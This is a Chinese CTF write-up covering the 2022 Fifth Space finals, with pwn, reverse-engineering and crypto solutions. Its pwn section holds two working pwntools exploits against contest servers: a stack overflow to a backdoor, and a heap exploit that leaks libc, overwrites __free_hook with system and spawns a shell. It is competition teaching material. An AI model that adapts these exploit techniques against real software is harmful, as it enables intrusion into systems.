---
title: 2022第五空间决赛WriteUp｜pwn、reverse、crypto方向合集
url: https://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247496906&idx=1&sn=779e156280e474fdc4161b184663520e&chksm=fa522174cd25a8628d29f572c076020e46ea9e8be05c35a6a5648033b5469ce4dea54ea91e24&scene=58&subscene=0#rd
source: 山石网科安全技术研究院
date: 2022-10-13
fetch_date: 2025-10-03T19:47:21.297238
---

# 2022第五空间决赛WriteUp｜pwn、reverse、crypto方向合集

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnSyf4jARiaK3kmBymhhT7weSGLWykNFsjiciaKekoRNAdiaqib0YnwdeIibfBYgsqRx0NsVERs6tWQ55TFA/0?wx_fmt=jpeg)

# 2022第五空间决赛WriteUp｜pwn、reverse、crypto方向合集

原创

NEURON

山石网科安全技术研究院

**PWN**

![](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnTFyibjANBPusict5SjpSML2skvb6MnVBQpBA94SOicbCfMHYn5iaPPrZiaAicn5nr3SFicQrjQhwo089nPA/640?wx_fmt=jpeg)

**1. takeeasy**

```
#!/usr/bin/env python2
# -*- coding: utf-8 -*- #

import os

from pwn import *
context.arch = "amd64"

# context.log_level = "debug"

# sh = process("./pwn")
sh = remote("39.107.243.76",24473)
backdoor = p64(0x40118A)
payload = "a"*24
payload += backdoor
sh.sendline(payload)

sh.interactive()
```

**2. easyfp**

```
from pwn import*
context(os='linux',arch='amd64')
context.log_level=True
libc=ELF('./libc.so.6')
#p = process(["./ld-2.27.so", "./a"],env={"LD_PRELOAD":"./libc-2.27.so"})
#p=process('./pwn',env={'LD_PRELOAD':'./libc.so.6'})
#p=process('./npuctf_pwn')
p=remote('39.106.158.47',30614)
def add(data):
 p.recvuntil('>> ')
 p.sendline('1')
 p.recvuntil('Name:\n')

 p.send(str(data))
def edit(data):
 p.recvuntil('>> ')
 p.sendline('3')
 p.recvuntil('ay what do you want to say')
 p.send(str(data))
def delete(data):
 p.recvuntil('>> ')
 p.sendline('2')
 p.recvuntil('Name:')

 p.send(data)
def bye(data):
 p.recvuntil('>> ')
 p.sendline('4')
 p.recvuntil('Do you really want to say bye?\n')

 p.sendline(data)

for i in range(12):
 add(str(i))
#edit('bbbbb')
#add('10')
for i in range(8):
 edit('bbbbb')
 bye('1')

add('bbb')
add('ccc')
delete('1')
delete('2')
delete('3')
delete('4')
delete('5')
delete('6')
delete('7')
delete('9')
delete('10')

add('1')
add('2')
add('3')
add('4')
add('5')
add('6')
add('7')

add('\xa0\x26')
delete('1')
delete('2')
edit('bbbbb')
bye('1')
delete('8')
edit('bbbbb')

edit('bbbbb')
bye('1')

add('\xf0')

add('1')
add('2')
payload=p64(0xfbad1887)+p64(0)*3+'\x00'
add(payload)
#edit('\x11')
add(payload)

p.recv(8)
leak=u64(p.recv(8))
libcbase=leak-(0x7ffff7fc1980-0x00007ffff7dd5000)

add('3')

delete('1')

delete('2')

delete('3')
#delete('bbb')

edit('bbbbb')

bye('1')
system=libcbase+libc.sym['system']
freehook=libcbase+libc.sym['__free_hook']
add(p64(freehook))
add('/bin/sh\x00')
add('/bin/sh\x00')
add(p64(system))

print hex(freehook)
#gdb.attach(p,'b *0x00005555555559cc')
#raw_input()
delete('/bin/sh\x00')

p.interactive()
```

**Reverse**

![](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnTFyibjANBPusict5SjpSML2skvb6MnVBQpBA94SOicbCfMHYn5iaPPrZiaAicn5nr3SFicQrjQhwo089nPA/640?wx_fmt=jpeg)

**DDI**

程序有壳，等其运行后再输入的时候中断，然后分别将其中几个dll dump出来：

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSyf4jARiaK3kmBymhhT7weSeqian8xWMRK8AzXEKfBurvrSD2WwJYfwUuQ1r5f3YZFbicicnxBr1L2Zg/640?wx_fmt=png)

脱壳后分析以下文件

```
Check .dll
__int64 check()
{
int i; // [rsp+2Ch] [rbp-4h]

for ( i = 0; i <= 31; ++i )
 *(_BYTE *)(qword_61BC92E4 + i) ^= 0x66u;
return qword_61BC92F4();
}
```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSyf4jARiaK3kmBymhhT7weSV7BT87PcMul1YCOTFX2ShdZPIZIImNZbMWtSicwmRojkDZlLcLTwEgA/640?wx_fmt=png)

```
Change.dll [check 调用]
__int64 change()
{
_BYTE v1[32]; // [rsp+0h] [rbp-80h] BYREF
char v2[16]; // [rsp+20h] [rbp-60h] BYREF
__int64 v3; // [rsp+30h] [rbp-50h] BYREF
char v4[48]; // [rsp+60h] [rbp-20h] BYREF

strcpy(v4, "0123456789abcdef");
memset(&v1[32], 0, 0x30ui64);
*(_WORD *)&v1[80] = 0;
sub_685419D8(v4, qword_6854A2F0, v2);
sub_685419D8(v4, qword_6854A2F0 + 16, &v3);
sub_68542FA8(qword_6854A2F0, v2, 32i64);
return qword_6854A2E8();
}
```

Cmp.dll

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSyf4jARiaK3kmBymhhT7weSnWhhA12puS92QEv26FAuM4tvPz72pEQ1cWicj0XyiaZU49v4ib7dRbCLQ/640?wx_fmt=png)

```
int cmp()
{
_BYTE v1[32]; // [rsp+0h] [rbp-80h] BYREF
char v2[56]; // [rsp+20h] [rbp-60h]
int i; // [rsp+58h] [rbp-28h]
int v4; // [rsp+5Ch] [rbp-24h]

v4 = 0;
memset(&v1[32], 0, 0x30ui64);
*(_WORD *)&v1[80] = 0;
v2[0] = -47;
v2[1] = -9;
v2[2] = -76;
v2[3] = 103;
v2[4] = 114;
v2[5] = 30;
v2[6] = 37;
v2[7] = -70;
v2[8] = 68;
v2[9] = 121;
v2[10] = 45;
v2[11] = -59;
v2[12] = -4;
v2[13] = -102;
v2[14] = -49;
v2[16] = -87;
v2[17] = -88;
v2[18] = -7;
v2[19] = -19;
v2[20] = 77;
v2[21] = 14;
v2[22] = 116;
v2[23] = 97;
v2[24] = -72;
v2[25] = 23;
v2[26] = -115;
v2[27] = -113;
v2[28] = -3;
v2[29] = 109;
v2[30] = 30;
v2[31] = 101;
for ( i = 0; i <= 31; ++i )
{
 if ( *((_BYTE *)input + i) != v2[i] )
   v4 = 1;
}
if ( v4 )
 return j_printf("u lose");
else
 return j_printf("u win");
}
```

Main.exe

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSyf4jARiaK3kmBymhhT7weSAJBnWu1E7HQIsL2MSAP71t2ibhJ9dKicrVV8xJRIvxvXTEKvNMLuXDvQ/640?wx_fmt=png)

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
sub_401650(argc, argv, envp);
printf("pls input your input:");
scanf("%s", input);
check();
return 0;
}
```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSyf4jARiaK3kmBymhhT7weSo1KXicRwpJLUXvz7nV5aJ82x68wB29QicbdIQ6fao5jDYud1oD6NoccA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSyf4jARiaK3kmBymhhT7weSGczdGUptia61FXSv5KSzCLXWL6aGvvZIUHntSpaVIhtiau9ZmDibgAPeQ/640?wx_fmt=png)

cmp check两个 dll在main函数中调用

Change.dll [check dll中调用]

现在要求 cmp dll中的核心代码

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSyf4jARiaK3kmBymhhT7weSbDRqJ6RlvFHPW5ibAiaM9US1zw1JPDyasK3dEQvy0BmUWf9U7VHcMDxA/640?wx_fmt=png)

发现是AES加密，首先input ^ 0x66：

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSyf4jARiaK3kmBymhhT7weSRqkbbEj1DWAdibpbYmMgCfFlQ0kgZ9bRpvTkf0jaGwSELoZvQGziaibrw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSyf4jARiaK3kmBymhhT7weS19DI5WXkXkZZiaMmhWfJbzzVfgbicKwyM0WdejZHfEcb2mSgSibtjoD1w/640?wx_fmt=png)

AES的key为0123456789abcdef，用python加密发现结果和本程序的结果有偏差，发现rcon被修改了：

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSyf4jARiaK3kmBymhhT7weST6EfIcV9icEA7ZkQw7dw2op0RxnmX19icZccGqpr0ia84epDG67cicgoNQ/640?wx_fmt=png)

网上找了一个解密程序，修改一下Rcon还有其中代码，然后将目标加密值dump出来直接解密得到flag：

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSyf4jARiaK3kmBymhhT7weSASfXp7oA92ICT2ojQd0LQE2hsdqTT4pcicv65yxzugUJ0gia0hF53mow/640?wx_fmt=png)

解密程序：https://github.com/Yunyung/Cryptography-AES-implement-in-C/blob/master/AES\_decrypt.c

修改如下几个地方代码如下，一个是Rcon数组，另外一个是flag输出的位置，异或0x66：

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSyf4jARiaK3kmBymhhT7weSu7WQsYmvUjt9HaFWMF763PM1Ypia9ictFBtxJObacg8tN76fGWWSQ5cg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSyf4jARiaK3kmBymhhT7weSpaK0icLGGW0DW1B9zHKibYBlDzBBHVxsptruZiblmnYyvzyZofUqhLdBQ/640?wx_fmt=png)

运行结果如下：

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSyf4jARiaK3kmBymhhT7weSZVxr8oRPWLt8q0YMD8UDzjZd6Mdofp5icvH366nGdIXSGSw6Jms9xhA/640?wx_fmt=png)

**Crypto**

![](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnTFyibjANBPusict5SjpSML2skvb6MnVBQpBA94SOicbCfMHYn5iaPPrZiaAicn5nr3SFicQrjQhwo089nPA/640?wx_fmt=jpeg)

**1. chaotic**

```
import cv2
import numpy as np
from tqdm import tqdm
def decrypt(img,key):
im=cv2.imread(img)[:,:,(0,1,2)]
[w,h,dim]=im.shape
pixels = im.flatten(order = 'C')
R=list(pixels[:w*h])
G=list(pixels[w*h:2*w*h])
B=list(pixels[2*w*h:])

# 先用原密钥生成相应的参数

a0=key[0]
p0=key[1]
u0=key[2]
v0=key[3]
w0=key[4]
x0=key[5]
y0=key[6]
z0=key[7]
q0=key[8]

a=36
b=3
c=28
d=16
k=0.2
t=100
U,V,W,X=Chen(u0,v0,w0,x0,a,b,c,d,k,t+3*w*h)
U=U[t:]
V=V[t:]
W=W[t:]
X=X[t:]

# 先用X解码

for i in range(3*w*h):
 rule='ACGT'
 if(int(X[i]%1/0.05) in [0,4,8,10,19]):
   rule='GTAC'
 elif(int(X[i]%1/0.05) in [1,6,12,14,17]):
   rule='TGCA'
 elif(int(X[i]%1/0.05) in [2,7,11,13,16]):
   rule='CTAG'
 elif(int(X[i]%1/0.05) in [3,5,9,15,18]):
   rule='TCGA'
 if(i/(w*h)<1):
   R[i]=Encode(R[i],rule)
 elif(i/(w*h)<2):
   G[i-w*h]=Encode(G[i-w*h],rule)
 else:
   B[i-2*w*h]=Encode(B[i-2*w*h],rule)

# 然后是加密部分，异或加密，所以全抄

start=[]
times=[]
for i in V:
 start.append(int(i*pow(10,12))%8)
for i in W:
 times.append(int(i*pow(10,12))%8)

startR=start[:w*h]
startG=start[w*h:2*w*h]
startB=start[2*w*h:]
timesR=times[:w*h]
timesG=times[w*h:2*w*h]
timesB=times[2*w*h:]
rules=['ACGT','CATG','GTAC','TCGA','CTAG','AGCT','TGCA','GATC']
for i in range(w*h):
 s=startR[i]
 for j in ra...